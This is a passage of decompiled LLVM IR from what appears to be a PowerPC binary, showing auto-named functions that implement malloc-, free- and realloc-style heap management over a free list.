  store i32 %v1_100080c8, i32* %stack_var_-40, align 4
  %v0_100080d8 = call i32 @function_100091f4()
  %v2_100080e0 = ptrtoint i32* %stack_var_-40 to i32
  %v3_100080e8 = call i32 @function_10008424(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1088) to i32*), i32 %v2_100080e0)
  store i32 %v3_100080e8, i32* %r31.global-to-local, align 4
  %v0_100080f4 = call i32 @function_100091f4()
  %v3_100080f8 = icmp eq i32 %v3_100080e8, 0
  br i1 %v3_100080f8, label %dec_label_pc_10008100, label %dec_label_pc_100081b0.thread

dec_label_pc_100081b0.thread:                     ; preds = %dec_label_pc_100080c4
  br label %dec_label_pc_100081c4

dec_label_pc_10008100:                            ; preds = %dec_label_pc_100080c4
  %v3_10008104 = load i32, i32* @global_var_100104ac.199, align 4
  store i32 %v3_10008104, i32* %r31.global-to-local, align 4
  %v3_10008108 = load i32, i32* %stack_var_-40, align 4
  %v2_1000810c = icmp ult i32 %v3_10008108, %v3_10008104
  br i1 %v2_1000810c, label %dec_label_pc_10008124, label %dec_label_pc_10008114

dec_label_pc_10008114:                            ; preds = %dec_label_pc_10008100
  %v1_10008118 = sub i32 0, %v3_10008104
  %v2_10008114 = add i32 %v3_10008104, -1
  %v1_1000811c = add i32 %v2_10008114, %v3_10008108
  %v2_10008120 = and i32 %v1_1000811c, %v1_10008118
  store i32 %v2_10008120, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008124

dec_label_pc_10008124:                            ; preds = %dec_label_pc_10008100, %dec_label_pc_10008114
  %v0_10008130 = call i32 @function_100091f4()
  %v0_10008134 = load i32, i32* %r31.global-to-local, align 4
  store i32 268468540, i32* @lr, align 4
  %v1_10008138 = call i32 @function_10009990(i32 %v0_10008134)
  %v3_1000813c = icmp eq i32 %v1_10008138, -1
  br i1 %v3_1000813c, label %dec_label_pc_1000815c, label %dec_label_pc_10008144

dec_label_pc_10008144:                            ; preds = %dec_label_pc_10008124
  %v1_10008144 = add i32 %v1_10008138, 3
  %v1_10008148 = call i32 @__asm_rlwinm(i32 %v1_10008144, i32 0, i32 0, i32 29)
  store i32 %v1_10008148, i32* @r30, align 4
  %v4_1000814c = icmp eq i32 %v1_10008148, %v1_10008138
  br i1 %v4_1000814c, label %dec_label_pc_1000815c, label %dec_label_pc_10008154

dec_label_pc_10008154:                            ; preds = %dec_label_pc_10008144
  %v2_10008154 = sub i32 %v1_10008148, %v1_10008138
  store i32 268468572, i32* @lr, align 4
  %v1_10008158 = call i32 @function_10009990(i32 %v2_10008154)
  br label %dec_label_pc_1000815c

dec_label_pc_1000815c:                            ; preds = %dec_label_pc_10008144, %dec_label_pc_10008124, %dec_label_pc_10008154
  %v0_10008164 = call i32 @function_100091f4()
  %v0_10008168 = load i32, i32* @r30, align 4
  %v3_10008168 = icmp eq i32 %v0_10008168, -1
  br i1 %v3_10008168, label %dec_label_pc_100081cc, label %dec_label_pc_100081b0

dec_label_pc_100081b0:                            ; preds = %dec_label_pc_1000815c
  store i32 ptrtoint (i32* @global_var_10012af4.268 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010440 to i32), i32* @r29, align 4
  %v0_10008184 = call i32 @function_100091f4()
  %v0_10008188 = load i32, i32* @r31, align 4
  %v0_1000818c = load i32, i32* @r30, align 4
  %v0_10008190 = load i32, i32* @r29, align 4
  store i32 268468632, i32* @lr, align 4
  %v3_10008194 = inttoptr i32 %v0_10008190 to i32*
  %v4_10008194 = call i32 @function_100085a8(i32* %v3_10008194, i32 %v0_1000818c, i32 %v0_10008188)
  %v0_10008198 = load i32, i32* @r29, align 4
  %v2_100081a0 = inttoptr i32 %v0_10008198 to i32*
  %v3_100081a0 = call i32 @function_10008424(i32* %v2_100081a0, i32 %v2_100080e0)
  store i32 %v3_100081a0, i32* %r31.global-to-local, align 4
  %v0_100081ac = call i32 @function_100091f4()
  %v3_100081b0 = icmp eq i32 %v3_100081a0, 0
  br i1 %v3_100081b0, label %dec_label_pc_100081c4.thread, label %dec_label_pc_100081c4

dec_label_pc_100081c4.thread:                     ; preds = %dec_label_pc_100081b0
  br label %dec_label_pc_100081cc

dec_label_pc_100081c4:                            ; preds = %dec_label_pc_100081b0, %dec_label_pc_100081b0.thread
  %v0_100081c4.pr6 = phi i32 [ %v3_100080e8, %dec_label_pc_100081b0.thread ], [ %v3_100081a0, %dec_label_pc_100081b0 ]
  %v3_100081b8 = load i32, i32* %stack_var_-40, align 4
  %v2_100081bc = inttoptr i32 %v0_100081c4.pr6 to i32*
  store i32 %v3_100081b8, i32* %v2_100081bc, align 4
  %v0_100081c0 = load i32, i32* %r31.global-to-local, align 4
  %v1_100081c0 = add i32 %v0_100081c0, 4
  store i32 %v1_100081c0, i32* @r31, align 4
  %v3_100081c4 = icmp eq i32 %v1_100081c0, 0
  br i1 %v3_100081c4, label %dec_label_pc_100081cc, label %dec_label_pc_100081dc

dec_label_pc_100081cc:                            ; preds = %dec_label_pc_100081c4.thread, %dec_label_pc_100081c4, %dec_label_pc_1000815c, %dec_label_pc_100080b8
  %v0_100081cc = call i32 @function_10004e38()
  %v2_100081d4 = inttoptr i32 %v0_100081cc to i32*
  store i32 12, i32* %v2_100081d4, align 4
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100081dc

dec_label_pc_100081dc:                            ; preds = %dec_label_pc_100081c4, %dec_label_pc_100081cc
  %v0_100081e0 = phi i32 [ %v1_100081c0, %dec_label_pc_100081c4 ], [ 0, %dec_label_pc_100081cc ]
  ret i32 %v0_100081e0

; uselistorder directives
  uselistorder i32 %v1_100081c0, { 1, 0, 2 }
  uselistorder i32 %v1_10008148, { 1, 0, 2 }
  uselistorder i32 %v1_10008138, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10008104, { 1, 0, 2, 3 }
  uselistorder i32 %v3_100080e8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 4, 0, 2, 1, 3, 5 }
  uselistorder label %dec_label_pc_100081dc, { 1, 0 }
  uselistorder label %dec_label_pc_100081cc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000815c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008124, { 1, 0 }
  uselistorder label %dec_label_pc_100080b8, { 1, 0 }
}

define i32 @function_100081f4() local_unnamed_addr {
dec_label_pc_100081f4:
  %v0_100081fc = load i32, i32* @r3, align 4
  %v3_100081fc = icmp eq i32 %v0_100081fc, 0
  br i1 %v3_100081fc, label %dec_label_pc_100082e0, label %dec_label_pc_1000820c

dec_label_pc_1000820c:                            ; preds = %dec_label_pc_100081f4
  %v1_10008210 = add i32 %v0_100081fc, -4
  %v2_10008210 = inttoptr i32 %v1_10008210 to i32*
  %v3_10008210 = load i32, i32* %v2_10008210, align 4
  store i32 %v3_10008210, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* @r26, align 4
  %v0_10008224 = call i32 @function_100091f4()
  %v0_1000822c = load i32, i32* @r28, align 4
  store i32 268468792, i32* @lr, align 4
  %v4_10008234 = call i32 @function_100085a8(i32* nonnull @global_var_10010440, i32 %v1_10008210, i32 %v0_1000822c)
  %v3_1000823c = load i32, i32* @global_var_100104ac.199, align 4
  store i32 %v4_10008234, i32* @r29, align 4
  %v1_10008244 = inttoptr i32 %v4_10008234 to i32*
  %v2_10008244 = load i32, i32* %v1_10008244, align 4
  store i32 %v2_10008244, i32* @r27, align 4
  %v1_10008248 = mul i32 %v3_1000823c, 8
  %v2_1000824c = icmp ult i32 %v2_10008244, %v1_10008248
  br i1 %v2_1000824c, label %dec_label_pc_10008280, label %dec_label_pc_10008254

dec_label_pc_10008254:                            ; preds = %dec_label_pc_1000820c
  store i32 ptrtoint (i32* @global_var_10012d24.271 to i32), i32* @r28, align 4
  %v0_10008264 = call i32 @function_100091f4()
  store i32 268468848, i32* @lr, align 4
  %v1_1000826c = call i32 @function_10009990(i32 0)
  %v0_10008270 = load i32, i32* @r31, align 4
  %v4_10008270 = icmp eq i32 %v0_10008270, %v1_1000826c
  br i1 %v4_10008270, label %dec_label_pc_10008288, label %dec_label_pc_10008278

dec_label_pc_10008278:                            ; preds = %dec_label_pc_10008254
  %v0_1000827c = call i32 @function_100091f4()
  br label %dec_label_pc_10008280

dec_label_pc_10008280:                            ; preds = %dec_label_pc_1000820c, %dec_label_pc_10008278
  br label %dec_label_pc_100082dc

dec_label_pc_10008288:                            ; preds = %dec_label_pc_10008254
  %v0_10008288 = load i32, i32* @r29, align 4
  %v1_10008288 = add i32 %v0_10008288, 4
  %v2_10008288 = inttoptr i32 %v1_10008288 to i32*
  %v3_10008288 = load i32, i32* %v2_10008288, align 4
  %v3_1000828c = icmp eq i32 %v3_10008288, 0
  br i1 %v3_1000828c, label %dec_label_pc_1000829c, label %dec_label_pc_10008294

dec_label_pc_10008294:                            ; preds = %dec_label_pc_10008288
  %v1_10008294 = add i32 %v0_10008288, 8
  %v2_10008294 = inttoptr i32 %v1_10008294 to i32*
  %v3_10008294 = load i32, i32* %v2_10008294, align 4
  %v2_10008298 = add i32 %v3_10008288, 8
  %v3_10008298 = inttoptr i32 %v2_10008298 to i32*
  store i32 %v3_10008294, i32* %v3_10008298, align 4
  %v0_1000829c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1000829c

dec_label_pc_1000829c:                            ; preds = %dec_label_pc_10008288, %dec_label_pc_10008294
  %v0_1000829c = phi i32 [ %v0_10008288, %dec_label_pc_10008288 ], [ %v0_1000829c.pre, %dec_label_pc_10008294 ]
  %v1_1000829c = add i32 %v0_1000829c, 8
  %v2_1000829c = inttoptr i32 %v1_1000829c to i32*
  %v3_1000829c = load i32, i32* %v2_1000829c, align 4
  %v1_100082a0 = add i32 %v0_1000829c, 4
  %v2_100082a0 = inttoptr i32 %v1_100082a0 to i32*
  %v3_100082a0 = load i32, i32* %v2_100082a0, align 4
  %v3_100082a4 = icmp eq i32 %v3_1000829c, 0
  br i1 %v3_100082a4, label %dec_label_pc_100082b4, label %dec_label_pc_100082ac

dec_label_pc_100082ac:                            ; preds = %dec_label_pc_1000829c
  %v2_100082ac = add i32 %v3_1000829c, 4
  %v3_100082ac = inttoptr i32 %v2_100082ac to i32*
  store i32 %v3_100082a0, i32* %v3_100082ac, align 4
  br label %dec_label_pc_100082b8

dec_label_pc_100082b4:                            ; preds = %dec_label_pc_1000829c
  store i32 %v3_100082a0, i32* @global_var_10010440, align 4
  br label %dec_label_pc_100082b8

dec_label_pc_100082b8:                            ; preds = %dec_label_pc_100082ac, %dec_label_pc_100082b4
  %v0_100082c0 = call i32 @function_100091f4()
  %v0_100082c4 = load i32, i32* @r27, align 4
  %v1_100082c4 = load i32, i32* @r29, align 4
  %v0_100082cc = load i32, i32* @r31, align 4
  %v2_100082c4 = sub i32 12, %v0_100082c4
  %v1_100082c8 = add i32 %v2_100082c4, %v1_100082c4
  %v2_100082cc = sub i32 %v1_100082c8, %v0_100082cc
  store i32 268468948, i32* @lr, align 4
  %v1_100082d0 = call i32 @function_10009990(i32 %v2_100082cc)
  br label %dec_label_pc_100082dc

dec_label_pc_100082dc:                            ; preds = %dec_label_pc_10008280, %dec_label_pc_100082b8
  %v0_100082dc = call i32 @function_100091f4()
  br label %dec_label_pc_100082e0

dec_label_pc_100082e0:                            ; preds = %dec_label_pc_100081f4, %dec_label_pc_100082dc
  %.0 = phi i32 [ undef, %dec_label_pc_100081f4 ], [ %v0_100082dc, %dec_label_pc_100082dc ]
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v0_1000829c, { 1, 0 }
  uselistorder i32 undef, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @function_10009990, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_100082e0, { 1, 0 }
  uselistorder label %dec_label_pc_100082dc, { 1, 0 }
  uselistorder label %dec_label_pc_100082b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000829c, { 1, 0 }
  uselistorder label %dec_label_pc_10008280, { 1, 0 }
}

define i32 @function_100082f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100082f4:
  %r27.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r3, align 4
  %v0_100082fc = load i32, i32* @r4, align 4
  %v3_100082fc = icmp eq i32 %v0_100082fc, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_100082fc, label %dec_label_pc_10008310, label %dec_label_pc_1000831c

dec_label_pc_10008310:                            ; preds = %dec_label_pc_100082f4
  store i32 ptrtoint ([3 x i8]* @global_var_10008314.274 to i32), i32* @lr, align 4
  %v0_10008310 = call i32 @function_100081f4()
  br label %dec_label_pc_10008328

dec_label_pc_1000831c:                            ; preds = %dec_label_pc_100082f4
  %v3_1000831c = icmp eq i32 %arg1, 0
  br i1 %v3_1000831c, label %dec_label_pc_10008328, label %dec_label_pc_10008334

dec_label_pc_10008328:                            ; preds = %dec_label_pc_1000831c, %dec_label_pc_10008310
  %storemerge = phi i32 [ 0, %dec_label_pc_10008310 ], [ %v0_100082fc, %dec_label_pc_1000831c ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268469036, i32* @lr, align 4
  %v0_10008328 = call i32 @function_1000809c()
  store i32 %v0_10008328, i32* @r28, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_10008334:                            ; preds = %dec_label_pc_1000831c
  %v1_10008334 = add i32 %v0_100082fc, 7
  %v1_10008338 = add i32 %arg1, -4
  store i32 %v1_10008338, i32* %r27.global-to-local, align 4
  %v1_1000833c = call i32 @__asm_rlwinm(i32 %v1_10008334, i32 0, i32 0, i32 29)
  store i32 %v1_1000833c, i32* %r31.global-to-local, align 4
  %v2_10008340 = inttoptr i32 %v1_10008338 to i32*
  %v3_10008340 = load i32, i32* %v2_10008340, align 4
  store i32 %v3_10008340, i32* @r30, align 4
  %v2_10008344 = icmp ugt i32 %v1_1000833c, 11
  br i1 %v2_10008344, label %dec_label_pc_10008350, label %dec_label_pc_1000834c

dec_label_pc_1000834c:                            ; preds = %dec_label_pc_10008334
  store i32 12, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10008350

dec_label_pc_10008350:                            ; preds = %dec_label_pc_10008334, %dec_label_pc_1000834c
  %v0_100083d0 = phi i32 [ %v1_1000833c, %dec_label_pc_10008334 ], [ 12, %dec_label_pc_1000834c ]
  %v3_10008350 = icmp ugt i32 %v0_100083d0, %v3_10008340
  br i1 %v3_10008350, label %dec_label_pc_10008358, label %dec_label_pc_100083d0

dec_label_pc_10008358:                            ; preds = %dec_label_pc_10008350
  store i32 ptrtoint (i32* @global_var_10012af4.268 to i32), i32* @r29, align 4
  %v0_10008364 = call i32 @function_100091f4()
  %v0_1000836c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000836c = load i32, i32* @r30, align 4
  %v2_1000836c = add i32 %v1_1000836c, %v0_1000836c
  %v1_10008370 = load i32, i32* %r31.global-to-local, align 4
  %v2_10008370 = sub i32 %v1_10008370, %v1_1000836c
  %v4_10008378 = call i32 @function_100084c4(i32* nonnull @global_var_10010440, i32 %v2_1000836c, i32 %v2_10008370)
  store i32 %v4_10008378, i32* %r27.global-to-local, align 4
  %v0_10008384 = call i32 @function_100091f4()
  %v3_10008388 = icmp eq i32 %v4_10008378, 0
  br i1 %v3_10008388, label %dec_label_pc_1000839c, label %dec_label_pc_10008390

dec_label_pc_10008390:                            ; preds = %dec_label_pc_10008358
  %v0_10008390 = load i32, i32* @r30, align 4
  %v2_10008390 = add i32 %v0_10008390, %v4_10008378
  %v1_10008394 = load i32, i32* @r28, align 4
  %v2_10008394 = add i32 %v1_10008394, -4
  %v3_10008394 = inttoptr i32 %v2_10008394 to i32*
  store i32 %v2_10008390, i32* %v3_10008394, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_1000839c:                            ; preds = %dec_label_pc_10008358
  %v0_1000839c = load i32, i32* %r31.global-to-local, align 4
  %v1_1000839c = add i32 %v0_1000839c, -4
  store i32 %v1_1000839c, i32* @r3, align 4
  store i32 268469156, i32* @lr, align 4
  %v0_100083a0 = call i32 @function_1000809c()
  store i32 %v0_100083a0, i32* @r3, align 4
  store i32 %v0_100083a0, i32* @r31, align 4
  %v3_100083a4 = icmp eq i32 %v0_100083a0, 0
  br i1 %v3_100083a4, label %dec_label_pc_100083ac, label %dec_label_pc_100083b4

dec_label_pc_100083ac:                            ; preds = %dec_label_pc_1000839c
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_100083b4:                            ; preds = %dec_label_pc_1000839c
  %v0_100083b4 = load i32, i32* @r28, align 4
  store i32 %v0_100083b4, i32* @r4, align 4
  %v0_100083b8 = load i32, i32* @r30, align 4
  %v1_100083b8 = add i32 %v0_100083b8, -4
  store i32 %v1_100083b8, i32* @r5, align 4
  store i32 268469184, i32* @lr, align 4
  %v0_100083bc = call i32 @function_10007104()
  %v0_100083c0 = load i32, i32* @r28, align 4
  store i32 %v0_100083c0, i32* @r3, align 4
  store i32 268469192, i32* @lr, align 4
  %v0_100083c4 = call i32 @function_100081f4()
  %v0_100083c8 = load i32, i32* @r31, align 4
  store i32 %v0_100083c8, i32* @r28, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_100083d0:                            ; preds = %dec_label_pc_10008350
  %v1_100083d0 = add i32 %v0_100083d0, 28
  %v3_100083d4 = icmp ugt i32 %v1_100083d0, %v3_10008340
  br i1 %v3_100083d4, label %dec_label_pc_1000840c, label %dec_label_pc_100083dc

dec_label_pc_100083dc:                            ; preds = %dec_label_pc_100083d0
  store i32 ptrtoint (i32* @global_var_10012af4.268 to i32), i32* @r29, align 4
  %v0_100083e8 = call i32 @function_100091f4()
  %v0_100083f0 = load i32, i32* %r27.global-to-local, align 4
  %v1_100083f0 = load i32, i32* %r31.global-to-local, align 4
  %v2_100083f0 = add i32 %v1_100083f0, %v0_100083f0
  %v1_100083f4 = load i32, i32* @r30, align 4
  %v2_100083f4 = sub i32 %v1_100083f4, %v1_100083f0
  store i32 268469248, i32* @lr, align 4
  %v4_100083fc = call i32 @function_100085a8(i32* nonnull @global_var_10010440, i32 %v2_100083f0, i32 %v2_100083f4)
  %v0_10008404 = call i32 @function_100091f4()
  %v0_10008408 = load i32, i32* @r31, align 4
  %v1_10008408 = load i32, i32* @r28, align 4
  %v2_10008408 = add i32 %v1_10008408, -4
  %v3_10008408 = inttoptr i32 %v2_10008408 to i32*
  store i32 %v0_10008408, i32* %v3_10008408, align 4
  br label %dec_label_pc_1000840c

dec_label_pc_1000840c:                            ; preds = %dec_label_pc_100083d0, %dec_label_pc_100083b4, %dec_label_pc_100083ac, %dec_label_pc_10008390, %dec_label_pc_10008328, %dec_label_pc_100083dc
  %v0_10008410 = load i32, i32* @r28, align 4
  ret i32 %v0_10008410

; uselistorder directives
  uselistorder i32 %v1_100083f0, { 1, 0 }
  uselistorder i32 %v4_10008378, { 1, 0, 2 }
  uselistorder i32 %v1_1000836c, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r27.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_10010440, { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000840c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10008350, { 1, 0 }
}

define i32 @function_10008424(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008424:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10008424 = inttoptr i32 %arg2 to i32*
  %v2_10008424 = load i32, i32* %v1_10008424, align 4
  %v1_10008428 = add i32 %v2_10008424, 3
  store i32 %v1_10008428, i32* %r9.global-to-local, align 4
  %v1_1000842c = call i32 @__asm_rlwinm(i32 %v1_10008428, i32 0, i32 0, i32 29)
  %v2_10008430 = icmp ugt i32 %v1_1000842c, 11
  br i1 %v2_10008430, label %dec_label_pc_100084b4.preheader, label %dec_label_pc_10008438

dec_label_pc_10008438:                            ; preds = %dec_label_pc_10008424
  br label %dec_label_pc_100084b4.preheader

dec_label_pc_100084b4.preheader:                  ; preds = %dec_label_pc_10008424, %dec_label_pc_10008438
  %storemerge20 = phi i32 [ 12, %dec_label_pc_10008438 ], [ %v1_1000842c, %dec_label_pc_10008424 ]
  %v0_10008498 = phi i32 [ 12, %dec_label_pc_10008438 ], [ %v1_1000842c, %dec_label_pc_10008424 ]
  store i32 %storemerge20, i32* %r11.global-to-local, align 4
  %storemerge2 = load i32, i32* %arg1, align 4
  store i32 %storemerge2, i32* %r9.global-to-local, align 4
  %v3_100084b45 = icmp eq i32 %storemerge2, 0
  br i1 %v3_100084b45, label %dec_label_pc_100084bc, label %dec_label_pc_10008444

dec_label_pc_10008444:                            ; preds = %dec_label_pc_100084b4.preheader, %dec_label_pc_100084b0
  %v0_100084b0 = phi i32 [ %storemerge, %dec_label_pc_100084b0 ], [ %storemerge2, %dec_label_pc_100084b4.preheader ]
  %v1_10008444 = inttoptr i32 %v0_100084b0 to i32*
  %v2_10008444 = load i32, i32* %v1_10008444, align 4
  store i32 %v2_10008444, i32* %r10.global-to-local, align 4
  %v2_10008448 = icmp ult i32 %v2_10008444, %v0_10008498
  br i1 %v2_10008448, label %dec_label_pc_100084b0, label %dec_label_pc_10008450

dec_label_pc_10008450:                            ; preds = %dec_label_pc_10008444
  %v1_10008450 = add i32 %v0_10008498, 44
  %v2_10008454 = icmp ult i32 %v2_10008444, %v1_10008450
  br i1 %v2_10008454, label %dec_label_pc_1000845c, label %dec_label_pc_10008498

dec_label_pc_1000845c:                            ; preds = %dec_label_pc_10008450
  %v1_1000845c = add i32 %v0_100084b0, 4
  %v2_1000845c = inttoptr i32 %v1_1000845c to i32*
  %v3_1000845c = load i32, i32* %v2_1000845c, align 4
  store i32 %v3_1000845c, i32* %r11.global-to-local, align 4
  %v3_10008460 = icmp eq i32 %v3_1000845c, 0
  br i1 %v3_10008460, label %dec_label_pc_10008470, label %dec_label_pc_10008468

dec_label_pc_10008468:                            ; preds = %dec_label_pc_1000845c
  %v1_10008468 = add i32 %v0_100084b0, 8
  %v2_10008468 = inttoptr i32 %v1_10008468 to i32*
  %v3_10008468 = load i32, i32* %v2_10008468, align 4
  %v2_1000846c = add i32 %v3_1000845c, 8
  %v3_1000846c = inttoptr i32 %v2_1000846c to i32*
  store i32 %v3_10008468, i32* %v3_1000846c, align 4
  %v0_10008470.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000848c.pre = load i32, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10008470

dec_label_pc_10008470:                            ; preds = %dec_label_pc_1000845c, %dec_label_pc_10008468
  %v0_1000848c = phi i32 [ %v2_10008444, %dec_label_pc_1000845c ], [ %v0_1000848c.pre, %dec_label_pc_10008468 ]
  %v0_10008470 = phi i32 [ %v0_100084b0, %dec_label_pc_1000845c ], [ %v0_10008470.pre, %dec_label_pc_10008468 ]
  %v1_10008470 = add i32 %v0_10008470, 8
  %v2_10008470 = inttoptr i32 %v1_10008470 to i32*
  %v3_10008470 = load i32, i32* %v2_10008470, align 4
  %v1_10008474 = add i32 %v0_10008470, 4
  %v2_10008474 = inttoptr i32 %v1_10008474 to i32*
  %v3_10008474 = load i32, i32* %v2_10008474, align 4
  %v3_10008478 = icmp eq i32 %v3_10008470, 0
  store i32 %v0_1000848c, i32* %r11.global-to-local, align 4
  br i1 %v3_10008478, label %dec_label_pc_1000848c, label %dec_label_pc_10008480

dec_label_pc_10008480:                            ; preds = %dec_label_pc_10008470
  %v2_10008484 = add i32 %v3_10008470, 4
  %v3_10008484 = inttoptr i32 %v2_10008484 to i32*
  store i32 %v3_10008474, i32* %v3_10008484, align 4
  br label %dec_label_pc_100084a0

dec_label_pc_1000848c:                            ; preds = %dec_label_pc_10008470
  store i32 %v3_10008474, i32* %arg1, align 4
  br label %dec_label_pc_100084a0

dec_label_pc_10008498:                            ; preds = %dec_label_pc_10008450
  %v2_10008498 = sub i32 %v2_10008444, %v0_10008498
  store i32 %v2_10008498, i32* %v1_10008444, align 4
  br label %dec_label_pc_100084a0

dec_label_pc_100084a0:                            ; preds = %dec_label_pc_1000848c, %dec_label_pc_10008480, %dec_label_pc_10008498
  %v0_100084a0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100084a0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100084a0 = sub i32 %v1_100084a0, %v0_100084a0
  store i32 %v2_100084a0, i32* %r9.global-to-local, align 4
  %v0_100084a4 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_100084a4, i32* %v1_10008424, align 4
  %v0_100084a8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100084a8 = add i32 %v0_100084a8, 12
  ret i32 %v1_100084a8

dec_label_pc_100084b0:                            ; preds = %dec_label_pc_10008444
  %v1_100084b0 = add i32 %v0_100084b0, 4
  %storemerge.in = inttoptr i32 %v1_100084b0 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_100084b4 = icmp eq i32 %storemerge, 0
  br i1 %v3_100084b4, label %dec_label_pc_100084b4.dec_label_pc_100084bc_crit_edge, label %dec_label_pc_10008444

dec_label_pc_100084b4.dec_label_pc_100084bc_crit_edge: ; preds = %dec_label_pc_100084b0
  br label %dec_label_pc_100084bc

dec_label_pc_100084bc:                            ; preds = %dec_label_pc_100084b4.dec_label_pc_100084bc_crit_edge, %dec_label_pc_100084b4.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10008470, { 1, 0 }
  uselistorder i32 %v2_10008444, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_100084b0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10008498, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 4, 5, 6, 3 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100084a0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008470, { 1, 0 }
  uselistorder label %dec_label_pc_10008444, { 1, 0 }
  uselistorder label %dec_label_pc_100084b4.preheader, { 1, 0 }
}

define i32 @function_100084c4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100084c4:
  %r11.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_100084c4 = load i32, i32* %arg1, align 4
  store i32 %v2_100084c4, i32* %r11.global-to-local, align 4
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v1_100084cc = add i32 %arg3, 3
  %v3_100085503 = icmp eq i32 %v2_100084c4, 0
  br i1 %v3_100085503, label %dec_label_pc_10008558, label %dec_label_pc_100084d4

dec_label_pc_100084d4:                            ; preds = %dec_label_pc_100084c4, %dec_label_pc_1000854c
  %v0_1000854c = phi i32 [ %v3_1000854c, %dec_label_pc_1000854c ], [ %v2_100084c4, %dec_label_pc_100084c4 ]
  %v1_100084d4 = inttoptr i32 %v0_1000854c to i32*
  %v2_100084d4 = load i32, i32* %v1_100084d4, align 4
  %v2_100084d8 = sub i32 %v0_1000854c, %v2_100084d4
  %v1_100084dc = add i32 %v2_100084d8, 12
  %v3_100084e0 = icmp ugt i32 %v1_100084dc, %arg2
  br i1 %v3_100084e0, label %dec_label_pc_1000854c, label %dec_label_pc_100084e8

dec_label_pc_100084e8:                            ; preds = %dec_label_pc_100084d4
  %v4_100084e0 = icmp eq i32 %v1_100084dc, %arg2
  br i1 %v4_100084e0, label %dec_label_pc_100084f0, label %dec_label_pc_10008558

dec_label_pc_100084f0:                            ; preds = %dec_label_pc_100084e8
  %v1_100084f0 = call i32 @__asm_rlwinm(i32 %v1_100084cc, i32 0, i32 0, i32 29)
  %v2_100084f4 = icmp ult i32 %v2_100084d4, %v1_100084f0
  br i1 %v2_100084f4, label %dec_label_pc_10008558, label %dec_label_pc_100084fc

dec_label_pc_100084fc:                            ; preds = %dec_label_pc_100084f0
  %v1_100084fc = add i32 %v1_100084f0, 44
  %v2_10008500 = icmp ult i32 %v2_100084d4, %v1_100084fc
  br i1 %v2_10008500, label %dec_label_pc_10008508, label %dec_label_pc_1000853c

dec_label_pc_10008508:                            ; preds = %dec_label_pc_100084fc
  %v0_10008508 = load i32, i32* %r11.global-to-local, align 4
  %v1_10008508 = add i32 %v0_10008508, 4
  %v2_10008508 = inttoptr i32 %v1_10008508 to i32*
  %v3_10008508 = load i32, i32* %v2_10008508, align 4
  %v3_1000850c = icmp eq i32 %v3_10008508, 0
  br i1 %v3_1000850c, label %dec_label_pc_1000851c, label %dec_label_pc_10008514

dec_label_pc_10008514:                            ; preds = %dec_label_pc_10008508
  %v1_10008514 = add i32 %v0_10008508, 8
  %v2_10008514 = inttoptr i32 %v1_10008514 to i32*
  %v3_10008514 = load i32, i32* %v2_10008514, align 4
  %v2_10008518 = add i32 %v3_10008508, 8
  %v3_10008518 = inttoptr i32 %v2_10008518 to i32*
  store i32 %v3_10008514, i32* %v3_10008518, align 4
  %v0_1000851c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000851c

dec_label_pc_1000851c:                            ; preds = %dec_label_pc_10008508, %dec_label_pc_10008514
  %v0_1000851c = phi i32 [ %v0_10008508, %dec_label_pc_10008508 ], [ %v0_1000851c.pre, %dec_label_pc_10008514 ]
